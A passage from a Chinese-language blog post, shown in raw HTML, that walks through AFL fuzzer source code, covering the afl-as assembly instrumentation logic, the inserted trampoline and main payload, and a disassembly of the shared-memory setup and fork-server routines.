is where the actual fun begins. For one, we only want to</span><br><span class="hljs-comment">       instrument the .text section. So, let&#x27;s keep track of that in processed</span><br><span class="hljs-comment">       files - and let&#x27;s set instr_ok accordingly. */</span><br><br>    <span class="hljs-keyword">if</span> (line[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\t&#x27;</span> &amp;&amp; line[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;.&#x27;</span>) &#123;<br><br>      <span class="hljs-comment">/* OpenBSD puts jump tables directly inline with the code, which is</span><br><span class="hljs-comment">         a bit annoying. They use a specific format of p2align directives</span><br><span class="hljs-comment">         around them, so we use that as a signal. */</span><br>      <span class="hljs-comment">// 处理OpenBSD的特殊情况。若遇到p2align，且后面跟上数字与换行的情况，设置skip_next_label=1</span><br>      <span class="hljs-keyword">if</span> (!clang_mode &amp;&amp; instr_ok &amp;&amp; !<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;p2align &quot;</span>, <span class="hljs-number">8</span>) &amp;&amp;<br>          <span class="hljs-built_in">isdigit</span>(line[<span class="hljs-number">10</span>]) &amp;&amp; line[<span class="hljs-number">11</span>] == <span class="hljs-string">&#x27;\n&#x27;</span>) skip_next_label = <span class="hljs-number">1</span>;<br>      <br>      <span class="hljs-comment">// 若line包含&quot;text\n&quot;, 或者&quot;section\t.text&quot;, 或者&quot;section\t__TEXT,__text&quot;, 或者&quot;section __TEXT,__text&quot;,</span><br>      <span class="hljs-comment">// 设置instr_ok为1, 跳过本次循环</span><br>      <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;text\n&quot;</span>, <span class="hljs-number">5</span>) ||<br>          !<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;section\t.text&quot;</span>, <span class="hljs-number">13</span>) ||<br>          !<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;section\t__TEXT,__text&quot;</span>, <span class="hljs-number">21</span>) ||<br>          !<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;section __TEXT,__text&quot;</span>, <span class="hljs-number">21</span>)) &#123;<br>        instr_ok = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">continue</span>;<br>      &#125;<br>      <span class="hljs-comment">// 同理，若发现以下非代码段字段，设置instr_ok为0，跳出循环</span><br>      <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;section\t&quot;</span>, <span class="hljs-number">8</span>) ||<br>          !<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;section &quot;</span>, <span class="hljs-number">8</span>) ||<br>          !<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;bss\n&quot;</span>, <span class="hljs-number">4</span>) ||<br>          !<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;data\n&quot;</span>, <span class="hljs-number">5</span>)) &#123;<br>        instr_ok = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">continue</span>;<br>      &#125;<br><br>    &#125;<br><br>    <span class="hljs-comment">/* Detect off-flavor assembly (rare, happens in gdb). When this is</span><br><span class="hljs-comment">       encountered, we set skip_csect until the opposite directive is</span><br><span class="hljs-comment">       seen, and we do not instrument. */</span><br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(line, <span class="hljs-string">&quot;.code&quot;</span>)) &#123;        <span class="hljs-comment">// 检测异架构的情况</span><br><br>      <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(line, <span class="hljs-string">&quot;.code32&quot;</span>)) skip_csect = use_64bit;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(line, <span class="hljs-string">&quot;.code64&quot;</span>)) skip_csect = !use_64bit;<br><br>    &#125;<br><br>    <span class="hljs-comment">/* Detect syntax changes, as could happen with hand-written assembly.</span><br><span class="hljs-comment">       Skip Intel blocks, resume instrumentation when back to AT&amp;T. */</span><br>    <span class="hljs-comment">// 检测语法更改，跳过intel形式，直到回到AT&amp;T形式</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(line, <span class="hljs-string">&quot;.intel_syntax&quot;</span>)) skip_intel = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(line, <span class="hljs-string">&quot;.att_syntax&quot;</span>)) skip_intel = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* Detect and skip ad-hoc __asm__ blocks, likewise skipping them. */</span><br>    <span class="hljs-comment">// 检测并跳过ad-hoc __asm__块</span><br>    <span class="hljs-keyword">if</span> (line[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;#&#x27;</span> || line[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;#&#x27;</span>) &#123;<br><br>      <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(line, <span class="hljs-string">&quot;#APP&quot;</span>)) skip_app = <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(line, <span class="hljs-string">&quot;#NO_APP&quot;</span>)) skip_app = <span class="hljs-number">0</span>;<br><br>    &#125;<br>    <br>    <span class="hljs-comment">// 插桩重点对象</span><br>    <span class="hljs-comment">/* If we&#x27;re in the right mood for instrumenting, check for function</span><br><span class="hljs-comment">       names or conditional labels. This is a bit messy, but in essence,</span><br><span class="hljs-comment">       we want to catch:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">         ^main:      - function entry point (always instrumented)</span><br><span class="hljs-comment">         ^.L0:       - GCC branch label</span><br><span class="hljs-comment">         ^.LBB0_0:   - clang branch label (but only in clang mode)</span><br><span class="hljs-comment">         ^\tjnz foo  - conditional branches</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       ...but not:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">         ^# BB#0:    - clang comments</span><br><span class="hljs-comment">         ^ # BB#0:   - ditto</span><br><span class="hljs-comment">         ^.Ltmp0:    - clang non-branch labels</span><br><span class="hljs-comment">         ^.LC0       - GCC non-branch labels</span><br><span class="hljs-comment">         ^.LBB0_0:   - ditto (when in GCC mode)</span><br><span class="hljs-comment">         ^\tjmp foo  - non-conditional jumps</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       Additionally, clang and GCC on MacOS X follow a different convention</span><br><span class="hljs-comment">       with no leading dots on labels, hence the weird maze of #ifdefs</span><br><span class="hljs-comment">       later on.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-keyword">if</span> (skip_intel || skip_app || skip_csect || !instr_ok ||<br>        line[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;#&#x27;</span> || line[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27; &#x27;</span>) <span class="hljs-keyword">continue</span>;     <span class="hljs-comment">// 若出现非法情况，跳出本次循环</span><br><br>    <span class="hljs-comment">/* Conditional branch instruction (jnz, etc). We append the instrumentation</span><br><span class="hljs-comment">       right after the branch (to instrument the not-taken path) and at the</span><br><span class="hljs-comment">       branch destination label (handled later on). */</span><br>    <br>    <span class="hljs-comment">// 若检测到非jmp的跳转，进行插桩，且ins_lines计数器+1</span><br>    <span class="hljs-keyword">if</span> (line[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\t&#x27;</span>) &#123;<br><br>      <span class="hljs-keyword">if</span> (line[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;j&#x27;</span> &amp;&amp; line[<span class="hljs-number">2</span>] != <span class="hljs-string">&#x27;m&#x27;</span> &amp;&amp; R(<span class="hljs-number">100</span>) &lt; inst_ratio) &#123;<br><br>        <span class="hljs-built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,<br>                R(MAP_SIZE));<br><br>        ins_lines++;<br><br>      &#125;<br><br>      <span class="hljs-keyword">continue</span>;<br><br>    &#125;<br><br>    <span class="hljs-comment">/* Label of some sort. This may be a branch destination, but we need to</span><br><span class="hljs-comment">       tread carefully and account for several different formatting</span><br><span class="hljs-comment">       conventions. */</span><br>    <br>    <span class="hljs-comment">// 检测合法分支</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __APPLE__</span><br><br>    <span class="hljs-comment">/* Apple: L&lt;whatever&gt;&lt;digit&gt;: */</span><br><br>    <span class="hljs-keyword">if</span> ((colon_pos = <span class="hljs-built_in">strstr</span>(line, <span class="hljs-string">&quot;:&quot;</span>))) &#123;<br><br>      <span class="hljs-keyword">if</span> (line[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;L&#x27;</span> &amp;&amp; <span class="hljs-built_in">isdigit</span>(*(colon_pos - <span class="hljs-number">1</span>))) &#123;<br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><br>    <span class="hljs-comment">/* Everybody else: .L&lt;whatever&gt;: */</span><br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(line, <span class="hljs-string">&quot;:&quot;</span>)) &#123;    <span class="hljs-comment">// 分支包含&quot;:&quot;</span><br><br>      <span class="hljs-keyword">if</span> (line[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;.&#x27;</span>) &#123;     <span class="hljs-comment">// 若第一个字符为.,则进行下述判断；否则直接设置instrument_next=1</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* __APPLE__ */</span></span><br><br>        <span class="hljs-comment">/* .L0: or LBB0_0: style jump destination */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __APPLE__        <span class="hljs-comment">// apple模式</span></span><br><br>        <span class="hljs-comment">/* Apple: L&lt;num&gt; / LBB&lt;num&gt; */</span><br>        <span class="hljs-comment">// apple的合法分支模式</span><br>        <span class="hljs-keyword">if</span> ((<span class="hljs-built_in">isdigit</span>(line[<span class="hljs-number">1</span>]) || (clang_mode &amp;&amp; !<span class="hljs-built_in">strncmp</span>(line, <span class="hljs-string">&quot;LBB&quot;</span>, <span class="hljs-number">3</span>)))<br>            &amp;&amp; R(<span class="hljs-number">100</span>) &lt; inst_ratio) &#123;<br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><br>        <span class="hljs-comment">/* Apple: .L&lt;num&gt; / .LBB&lt;num&gt; */</span><br>        <br>        <span class="hljs-comment">// 若gcc与clang是合法分支模式，且skip_next_label为空，则一定概率设置instument_next为1</span><br>        <span class="hljs-keyword">if</span> ((<span class="hljs-built_in">isdigit</span>(line[<span class="hljs-number">2</span>]) || (clang_mode &amp;&amp; !<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">1</span>, <span class="hljs-string">&quot;LBB&quot;</span>, <span class="hljs-number">3</span>)))<br>            &amp;&amp; R(<span class="hljs-number">100</span>) &lt; inst_ratio) &#123;<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* __APPLE__ */</span></span><br><br>          <span class="hljs-comment">/* An optimization is possible here by adding the code only if the</span><br><span class="hljs-comment">             label is mentioned in the code in contexts other than call / jmp.</span><br><span class="hljs-comment">             That said, this complicates the code by requiring two-pass</span><br><span class="hljs-comment">             processing (messy with stdin), and results in a speed gain</span><br><span class="hljs-comment">             typically under 10%, because compilers are generally pretty good</span><br><span class="hljs-comment">             about not generating spurious intra-function jumps.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">             We use deferred output chiefly to avoid disrupting</span><br><span class="hljs-comment">             .Lfunc_begin0-style exception handling calculations (a problem on</span><br><span class="hljs-comment">             MacOS X). */</span><br><br>          <span class="hljs-keyword">if</span> (!skip_next_label) instrument_next = <span class="hljs-number">1</span>; <span class="hljs-keyword">else</span> skip_next_label = <span class="hljs-number">0</span>;<br><br>        &#125;<br><br>      &#125; <span class="hljs-keyword">else</span> &#123;<br><br>        <span class="hljs-comment">/* Function label (always instrumented, deferred mode). */</span><br><br>        instrument_next = <span class="hljs-number">1</span>;<br>    <br>      &#125;<br><br>    &#125;<br><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (ins_lines)        <span class="hljs-comment">// 若ins_lines &gt;= 0, 将main_payload_64写入到outf文件</span><br>    <span class="hljs-built_in">fputs</span>(use_64bit ? main_payload_64 : main_payload_32, outf);<br><br>  <span class="hljs-keyword">if</span> (input_file) fclose(inf);<br>  fclose(outf);         <span class="hljs-comment">// 关闭inf文件与outf文件</span><br><br>  <span class="hljs-keyword">if</span> (!be_quiet) &#123;      <span class="hljs-comment">// 若非quiet模式，输出插桩情况</span><br><br>    <span class="hljs-keyword">if</span> (!ins_lines) WARNF(<span class="hljs-string">&quot;No instrumentation targets found%s.&quot;</span>,<br>                          pass_thru ? <span class="hljs-string">&quot; (pass-thru mode)&quot;</span> : <span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-keyword">else</span> OKF(<span class="hljs-string">&quot;Instrumented %u locations (%s-bit, %s mode, ratio %u%%).&quot;</span>,<br>             ins_lines, use_64bit ? <span class="hljs-string">&quot;64&quot;</span> : <span class="hljs-string">&quot;32&quot;</span>,<br>             getenv(<span class="hljs-string">&quot;AFL_HARDEN&quot;</span>) ? <span class="hljs-string">&quot;hardened&quot;</span> : <br>             (sanitizer ? <span class="hljs-string">&quot;ASAN/MSAN&quot;</span> : <span class="hljs-string">&quot;non-hardened&quot;</span>),<br>             inst_ratio);<br> <br>  &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="插桩代码分析"><a href="#插桩代码分析" class="headerlink" title="插桩代码分析"></a>插桩代码分析</h3><p>插桩过程中，我们插入了<code>trampoline_fmt_64</code>与<code>main_payload_64</code>。</p><p>接下来，对插入的内容进行分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs assembly">static const u8* trampoline_fmt_64 =<br><br>  &quot;\n&quot;<br>  &quot;/* --- AFL TRAMPOLINE (64-BIT) --- */\n&quot;<br>  &quot;\n&quot;<br>  &quot;.align 4\n&quot;<br>  &quot;\n&quot;<br>  &quot;leaq -(128+24)(%%rsp), %%rsp\n&quot;<br>  &quot;movq %%rdx,  0(%%rsp)\n&quot;<br>  &quot;movq %%rcx,  8(%%rsp)\n&quot;<br>  &quot;movq %%rax, 16(%%rsp)\n&quot;<br>  &quot;movq $0x%08x, %%rcx\n&quot;<br>  &quot;call __afl_maybe_log\n&quot;<br>  &quot;movq 16(%%rsp), %%rax\n&quot;<br>  &quot;movq  8(%%rsp), %%rcx\n&quot;<br>  &quot;movq  0(%%rsp), %%rdx\n&quot;<br>  &quot;leaq (128+24)(%%rsp), %%rsp\n&quot;<br>  &quot;\n&quot;<br>  &quot;/* --- END --- */\n&quot;<br>  &quot;\n&quot;;<br></code></pre></td></tr></table></figure><p>这个汇编格式为AT&amp;T格式，在IDA中反编译插桩过的源码，可得到intel格式的汇编。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">lea     rsp, [rsp-98h]<br>mov     [rsp+0C0h+var_C0], rdx<br>mov     [rsp+0C0h+var_B8], rcx<br>mov     [rsp+0C0h+var_B0], rax<br>mov     rcx, 0DE9Eh<br>call    __afl_maybe_log<br>mov     rax, [rsp+0C0h+var_B0]<br>mov     rcx, [rsp+0C0h+var_B8]<br>mov     rdx, [rsp+0C0h+var_C0]<br>lea     rsp, [rsp+98h]<br></code></pre></td></tr></table></figure><p>主要含义为：</p><ol><li>为变量分配栈空间</li><li>保存rdx，rcx，rax的值</li><li>将rcx的值设置为R(MAP_SIZE)，作为桩代码标志</li><li>调用__afl_maybe_log</li><li>恢复rdx，rcx，rax的值</li></ol><p>重点调用<code>__afl_maybe_log</code>函数，对该函数进行分析。</p><p>笔者自知实力不足，以下分析主要引用<a href="https://mp.weixin.qq.com/s/5bXU__xGwKMLw7eKbyh9gQ">深信服千里目安全实验室</a>。</p><p><img src="/./img/afl%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%BA%8C/image-20231004174003896.png" alt="image-20231004174003896"></p><p>首先，对上述引用的变量进行解释。（参考<code>main_payload_64</code>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#ifdef __APPLE__<br><br>  &quot;  .comm   __afl_area_ptr, 8\n&quot;<br>#ifndef COVERAGE_ONLY<br>  &quot;  .comm   __afl_prev_loc, 8\n&quot;<br>#endif /* !COVERAGE_ONLY */<br>  &quot;  .comm   __afl_fork_pid, 4\n&quot;<br>  &quot;  .comm   __afl_temp, 4\n&quot;<br>  &quot;  .comm   __afl_setup_failure, 1\n&quot;<br><br>#else<br><br>  &quot;  .lcomm   __afl_area_ptr, 8\n&quot;<br>#ifndef COVERAGE_ONLY<br>  &quot;  .lcomm   __afl_prev_loc, 8\n&quot;<br>#endif /* !COVERAGE_ONLY */<br>  &quot;  .lcomm   __afl_fork_pid, 4\n&quot;<br>  &quot;  .lcomm   __afl_temp, 4\n&quot;<br>  &quot;  .lcomm   __afl_setup_failure, 1\n&quot;<br><br>#endif /* ^__APPLE__ */<br><br>  &quot;  .comm    __afl_global_area_ptr, 8, 8\n&quot;<br>  &quot;\n&quot;<br></code></pre></td></tr></table></figure><p>定义了以下变量：</p><p><strong>__afl_area_ptr</strong>: 共享内存地址</p><p><strong>__afl_prev_loc</strong>: 上一个插桩位置</p><p><strong>__afl_fork_pid</strong>: fork server产生的子进程的pid</p><p><strong>__afl_global_area_ptr</strong>: 临时变量</p><p><strong>__afl_setup_failure</strong>: 失败标识位</p><p><strong>__afl_global_area_ptr</strong>: 全局指针</p><p>这里主要借IDA中intel格式汇编进行分析。</p><p><strong><code>__afl_maybe_log</code></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">lahf<br>seto    al<br>mov     rdx, cs:__afl_area_ptr<br>test    rdx, rdx<br>jz      short __afl_setup<br></code></pre></td></tr></table></figure><p>首先，使用 <code>lahf</code> 指令（加载状态标志位到<code>AH</code>）将EFLAGS寄存器的低八位复制到 <code>AH</code>，被复制的标志位包括：符号标志位（SF）、零标志位（ZF）、辅助进位标志位（AF）、奇偶标志位（PF）和进位标志位（CF），使用该指令可以方便地将标志位副本保存在变量中；</p><p>然后，使用 <code>seto</code> 指令溢出置位；</p><p>最后，判断<code>__afl_area_ptr</code>是否为空。若为空跳转到<code>__afl_setup</code>，否则继续执行。</p><p><strong><code>__afl_setup</code></strong></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">__afl_setup:</span><br><span class="hljs-keyword">cmp</span>     <span class="hljs-built_in">cs</span>:__afl_setup_failure, <span class="hljs-number">0</span><br><span class="hljs-keyword">jnz</span>     short __afl_return<br><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdx</span>, offset __afl_global_area_ptr<br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rdx</span>, [<span class="hljs-built_in">rdx</span>]<br><span class="hljs-keyword">test</span>    <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">rdx</span><br><span class="hljs-keyword">jz</span>      short __afl_setup_first<br><br><span class="hljs-keyword">mov</span>     <span class="hljs-built_in">cs</span>:__afl_area_ptr, <span class="hljs-built_in">rdx</span><br><span class="hljs-keyword">jmp</span>     short __afl_store<br></code></pre></td></tr></table></figure><p>首先，判断<code>__afl_setup_failure</code>是否为空，即判断是否出错。若出错直接返回，否则跳转到<code>__afl_return</code>。</p><p>其次，判断<code>__afl_global_area_ptr</code>是否为空。若为空，则跳转到<code>__afl_setup_first</code>，否则将<code>__afl_global_area_ptr</code>赋值给<code>__afl_area_ptr</code>，调用<code>__afl_store</code>。</p><p><strong><code>__afl_setup_first</code></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs assembly">__afl_setup_first:<br>lea     rsp, [rsp-160h]<br>mov     [rsp+160h+var_160], rax<br>mov     [rsp+160h+var_158], rcx<br>mov     [rsp+160h+var_150], rdi<br>mov     [rsp+160h+var_140], rsi<br>mov     [rsp+160h+var_138], r8<br>mov     [rsp+160h+var_130], r9<br>mov     [rsp+160h+var_128], r10<br>mov     [rsp+160h+var_120], r11<br>movq    [rsp+160h+var_100], xmm0<br>movq    [rsp+160h+var_F0], xmm1<br>movq    [rsp+160h+var_E0], xmm2<br>movq    [rsp+160h+var_D0], xmm3<br>movq    [rsp+160h+var_C0], xmm4<br>movq    [rsp+160h+var_B0], xmm5<br>movq    [rsp+160h+var_A0], xmm6<br>movq    [rsp+160h+var_90], xmm7<br>movq    [rsp+160h+var_80], xmm8<br>movq    [rsp+160h+var_70], xmm9<br>movq    [rsp+160h+var_60], xmm10<br>movq    [rsp+160h+var_50], xmm11<br>movq    [rsp+160h+var_40], xmm12<br>movq    [rsp+160h+var_30], xmm13<br>movq    [rsp+160h+var_20], xmm14<br>movq    [rsp+160h+var_10], xmm15<br>push    r12<br>mov     r12, rsp<br>sub     rsp, 10h<br>and     rsp, 0FFFFFFFFFFFFFFF0h<br>lea     rdi, _AFL_SHM_ENV ; &quot;__AFL_SHM_ID&quot;<br>call    getenv          ; PIC mode<br>test    rax, rax<br>jz      __afl_setup_abort<br><br>mov     rdi, rax        ; nptr<br>call    atoi            ; PIC mode<br>xor     rdx, rdx        ; shmflg<br>xor     rsi, rsi        ; shmaddr<br>mov     rdi, rax        ; shmid<br>call    shmat           ; PIC mode<br>cmp     rax, 0FFFFFFFFFFFFFFFFh<br>jz      __afl_setup_abort<br><br>mov     rdx, rax<br>mov     cs:__afl_area_ptr, rax<br>mov     rdx, offset __afl_global_area_ptr<br>mov     [rdx], rax<br>mov     rdx, rax<br></code></pre></td></tr></table></figure><p>首先，保存寄存器的值，将rsp进行16字节对齐</p><p>然后，调用<code>getenv</code>获取共享内存的<strong>id</strong>（共享内存id在afl-fuzz中设置）。若获取成功，则继续向下执行；若获取失败，则跳转到<code>__afl_setup_abort</code>。</p><p>其次，调用<code>atoi</code>将共享id转换为int型，调用<code>shmat</code>启动共享内存。若成功，则继续向下执行；否则，跳转到<code>__afl_setup_abort</code>。</p><p>最后，把共享内存地址赋值给<code>__afl_area_ptr</code>与<code>__afl_global_area_ptr</code></p><p><strong><code>__afl_forkserver</code></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">__afl_forkserver:<br>push    rdx<br>push    rdx<br>mov     rdx, 4          ; n<br>lea     rsi, __afl_temp ; buf<br>mov     rdi, 0C7h       ; fd<br>call    write           ; PIC mode<br>cmp     rax, 4<br>jnz     __afl_fork_resume<br><br></code></pre></td></tr></table></figure><p>向<code>FORKSRV_FD + 1</code>(管道)写入<code>__afl_temp</code>，告诉父程序，<strong>fork server</strong>启动成功。</p><p><strong><code>__afl_fork_wait_loop</code></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs assembly">__afl_fork_wait_loop:   ; nbytes<br>mov     rdx, 4<br>lea     rsi, __afl_temp ; buf<br>mov     rdi, 0C6h       ; status<br>call    read            ; PIC mode<br>cmp     rax, 4<br>jnz     __afl_die<br><br>call    fork            ; PIC mode<br>cmp     rax, 0<br>jl      __afl_die<br>jz      short __afl_fork_resume<br><br>mov     cs:__afl_fork_pid, eax<br>mov     rdx, 4          ; n<br>lea     rsi, __afl_fork_pid ; buf<br>mov     rdi, 0C7h       ; fd<br>call    write           ; PIC mode<br>mov     rdx, 0          ; options<br>lea     rsi, __afl_temp ; stat_loc<br>mov     rdi, qword ptr cs:__afl_fork_pid ; pid<br>call    waitpid         ; PIC mode<br>cmp     rax, 0<br>jle     __afl_die<br><br>mov     rdx, 4          ; n<br>lea     rsi, __afl_temp ; buf<br>mov     rdi, 0C7h       ; fd<br>call    write           ; PIC mode<br>jmp     __afl_fork_wait_loop<br></code></pre></td></tr></table></figure><ol><li>从<code>FORKSRV_FD </code>，即控制管道中获取指令，读入4bytes到<code>__afl_temp</code>。若读取成功，继续执行；若读取失败，跳转到<code>__afl_die</code>。</li><li>调用<code>fork</code>生成子进程，子进程调用<code>__afl_fork_resume</code></li><li>父进程调用<code>write</code>将子进程的pid写入到<code>FORKSRV_FD + 1</code>中，并调用<code>waitpid</code>等待子进程结束，并将字进程状态信息写入到<code>FORKSRV_FD + 1</code>中</li></ol><p><strong><code>__afl_fork_resume</code></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs assembly">__afl_fork_resume:      ; fd<br>mov     rdi, 0C6h<br>call    close           ; PIC mode<br>mov     rdi, 0C7h       ; fd<br>call    close           ; PIC mode<br>pop     rdx<br>pop     rdx<br>mov     rsp, r12<br>pop     r12<br>mov     rax, [rsp+160h+var_160]<br>mov     rcx, [rsp+160h+var_158]<br>mov     rdi, [rsp+160h+var_150]<br>mov     rsi, [rsp+160h+var_140]<br>mov     r8, [rsp+160h+var_138]<br>mov     r9, [rsp+160h+var_130]<br>mov     r10, [rsp+160h+var_128]<br>mov     r11, [rsp+160h+var_120]<br>movq    xmm0, 